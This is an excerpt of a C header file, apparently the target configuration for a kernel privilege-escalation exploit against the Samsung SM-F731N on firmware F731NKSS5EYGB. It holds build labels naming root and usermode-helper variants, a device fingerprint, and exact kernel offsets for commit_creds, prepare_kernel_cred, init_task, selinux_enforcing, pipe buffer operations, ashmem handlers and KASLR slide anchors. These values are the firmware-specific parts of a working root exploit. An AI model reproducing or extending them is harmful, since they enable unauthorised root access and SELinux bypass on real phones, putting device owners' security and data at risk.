...
/*
 * SM-F731N F731NKSS5EYGB clean target.
 *
 * Firmware-dependent addresses and layouts in this file were derived from
 * the exact EYGB Image/ELF/BTF and BL. No value was imported from dm1q.
...
#define BUILD_VARIANT_LABEL \
  "b5q-F731NKSS5EYGB-clean-tracefs-mcast-configfs-pipe-root"
...
#else
#define BUILD_VARIANT_LABEL "b5q-F731NKSS5EYGB-clean-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/b5qksx/b5q:15/AP3A.240905.015.A2/F731NKSS5EYGB:user/release-keys"
#endif
...
#error b5q stack writer must be selected by the build
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/b5q-F731NKSS5EYGB/p0_fingerprint.h"
#endif
...
#define INIT_TASK_OFF 0x02ac9bc0ULL
#define PREPARE_KERNEL_CRED_OFF 0x0011db04ULL
#define COMMIT_CREDS_OFF 0x0011f840ULL
#define OVERRIDE_CREDS_OFF 0x0011e918ULL
#define ROOT_TASK_GROUP_OFF 0x02b79ac0ULL
#define SELINUX_ENFORCING_OFF 0x02c4e438ULL
#define KMALLOC_CACHES_OFF 0x01f77590ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01da2ba0ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0295e480ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00103e50ULL

#define ASHMEM_FOPS_OFF 0x01f20cd0ULL
#define ASHMEM_MISC_FOPS_OFF 0x02ac1b88ULL
#define ASHMEM_IOCTL_OFF 0x010b5dccULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x010b6428ULL
#define ASHMEM_MMAP_OFF 0x010b6480ULL
#define ASHMEM_OPEN_OFF 0x010b6760ULL
#define ASHMEM_RELEASE_OFF 0x010b67f8ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x010b6914ULL
#define CONFIGFS_READ_ITER_OFF 0x005d30a0ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005d3ac8ULL
#define COPY_SPLICE_READ_OFF 0x00523f68ULL
#define NOOP_LLSEEK_OFF 0x004b6d9cULL
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01c96866ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02961dc0ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02a7f960ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02ceaf29ULL
